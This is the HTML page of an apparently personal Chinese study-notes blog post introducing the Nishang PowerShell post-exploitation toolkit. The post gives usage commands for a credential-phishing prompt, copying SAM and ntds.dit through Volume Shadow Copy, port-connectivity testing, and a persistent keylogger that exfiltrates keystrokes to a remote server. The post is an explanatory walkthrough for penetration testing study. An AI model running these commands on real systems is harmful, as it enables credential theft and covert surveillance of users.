@@ -1,0 +1,794 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="scareing的学习笔记" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="Nishang模块简介及演示** Nishang **  Nishang是GitHub上的非常好用的Powershell后渗透模块，广泛用于渗透测试的各个阶段.Nishang在PowerShell3.0以上的环境才能正常使用，意思就是win7及更低版本的系统中可能使用有问题。并且会被杀软拦。  $PSVersionTable //查看PowerShell版本  Antak-Webshell //w">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Nishang模块简介及演示">
+<meta property="og:url" content="https://github.com/scareing/scareing.github.io/2019/09/06/Nishang模块简介及演示/index.html">
+<meta property="og:site_name" content="scareing的学习笔记">
+<meta property="og:description" content="Nishang模块简介及演示** Nishang **  Nishang是GitHub上的非常好用的Powershell后渗透模块，广泛用于渗透测试的各个阶段.Nishang在PowerShell3.0以上的环境才能正常使用，意思就是win7及更低版本的系统中可能使用有问题。并且会被杀软拦。  $PSVersionTable //查看PowerShell版本  Antak-Webshell //w">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/3.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/4.png">
+<meta property="og:updated_time" content="2019-09-06T12:23:06.019Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Nishang模块简介及演示">
+<meta name="twitter:description" content="Nishang模块简介及演示** Nishang **  Nishang是GitHub上的非常好用的Powershell后渗透模块，广泛用于渗透测试的各个阶段.Nishang在PowerShell3.0以上的环境才能正常使用，意思就是win7及更低版本的系统中可能使用有问题。并且会被杀软拦。  $PSVersionTable //查看PowerShell版本  Antak-Webshell //w">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://github.com/scareing/scareing.github.io/2019/09/06/Nishang模块简介及演示/">
+
+
+
+
+
+  <title>Nishang模块简介及演示 | scareing的学习笔记</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">scareing的学习笔记</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">道可道，非常道, 名可名，非常名!</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://github.com/scareing/scareing.github.io/2019/09/06/Nishang模块简介及演示/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="scareing">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/Bloglogo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="scareing的学习笔记">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Nishang模块简介及演示</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-09-06T05:23:06-07:00">
+                2019-09-06
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="Nishang模块简介及演示"><a href="#Nishang模块简介及演示" class="headerlink" title="Nishang模块简介及演示"></a>Nishang模块简介及演示</h1><p>** Nishang **</p>
+<blockquote>
+<p>Nishang是GitHub上的非常好用的Powershell后渗透模块，广泛用于渗透测试的各个阶段.<br>Nishang在PowerShell3.0以上的环境才能正常使用，意思就是win7及更低版本的系统中可能使用有问题。并且会被杀软拦。</p>
+</blockquote>
+<pre><code>$PSVersionTable //查看PowerShell版本</code></pre><p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/1.png" alt="avatar"></p>
+<ul>
+<li>Antak-Webshell //webshell</li>
+<li>Backdoor //后门</li>
+<li>Client //客户端</li>
+<li>Escalation //提权</li>
+<li>Execution //RCE</li>
+<li>Gather //信息收集</li>
+<li>Misc //杂项</li>
+<li>Pivot //跳板及远程执行exe</li>
+<li>Scan //扫描</li>
+<li>powerpreter //文件下载及持续性</li>
+</ul>
+<h2 id="Gather"><a href="#Gather" class="headerlink" title="Gather"></a>Gather</h2><p>** Invoke-CredentialsPhish.ps1 **</p>
+<pre><code>Invoke-CredentialsPhish //开启钓鱼</code></pre><p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/2.png" alt="avatar"></p>
+<blockquote>
+<p>欺骗目标主机用户输入Windows账号密码，并且如果不输入正确的账号密码，不能直接关闭。</p>
+</blockquote>
+<p>** Copy-VSS.ps1 **</p>
+<p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/1.png" alt="avatar"></p>
+<blockquote>
+<p>利用Volume Shadow Copy服务复制sam文件，如果机器是域控的话，ntds.dit和SYSTEM hive也能被拷贝出来。</p>
+</blockquote>
+<pre><code>Copy-VSS //直接把文件保存到当前路径
+Copy-VSS -DestinationDir C:\temp //保存到指定的已存在路径</code></pre><p>** FireBuster.ps1 and FireListener.ps1 **</p>
+<blockquote>
+<p>FireBuster.ps1用于被控端测试端口连通性的。<br>FireListener.ps1用于本机接收连通性测试结果。</p>
+</blockquote>
+<pre><code>FireBuster 172.22.35.250 80-100ose //被控端的80-100端口连接主机的80-100端口。
+FireListener 80-100 //主机监听80-100端口。</code></pre><p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/3.png" alt="avatar"><br><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/4.png" alt="avatar"><br>** Keylogger.ps1 **</p>
+<blockquote>
+<p>Nishang的键盘记录虽然很强大，但是奈何我还没有理解。<br>键盘记录默认保存在当前用户的temp目录下，默认文件名为key.log并且，内容好像是被混淆过，需要用Nishang Utility模块下的Parse_Keys.ps1来解析为明文。</p>
+</blockquote>
+<pre><code>.\Keylogger.ps1 -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -MagicString stopthis //书上是解释的说检查给出网页中是否包含stopthis也就是我们给出的字符串。如果存在就不记录。
+.\Keylogger.ps1 -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -MagicString stopthis -exfil -ExfilOption WebS
+erver -URL http://192.168.254.226/data/catch.php //将记录发送到指定的可以记录Post请求的服务器。
+.\Keylogger.ps1 -persist //持久化记录，重启后依旧会继续运行。
+Parse_Keys C:\Users\wdnmd\AppData\Local\Temp\Key.log .\parsed.txt //将key.log解析到当前目录下的parsed.txt。</code></pre><p>实在无法理解为什么非要给出一个网址及字符串，但是经过尝试可以将这两个参数给定为空格。<br>** Get-PassHints.ps1 **</p>
+<blockquote>
+<p>获取用户密码的提示信息，如果有的话。</p>
+</blockquote>
+<pre><code>Get-PassHints</code></pre>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/09/06/PowerSploit基本功能演示/" rel="next" title="PowerSploit基本功能演示">
+                <i class="fa fa-chevron-left"></i> PowerSploit基本功能演示
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/09/06/cmd绕过空格过滤/" rel="prev" title="cmd绕过空格过滤">
+                cmd绕过空格过滤 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/Bloglogo.jpg" alt="scareing">
+            
+              <p class="site-author-name" itemprop="name">scareing</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:jickhab@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Nishang模块简介及演示"><span class="nav-number">1.</span> <span class="nav-text">Nishang模块简介及演示</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Gather"><span class="nav-number">1.1.</span> <span class="nav-text">Gather</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">scareing</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+    
+       <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;"></canvas> 
+       <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+       <script type="text/javascript" src="/js/src/fireworks.js"></script>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
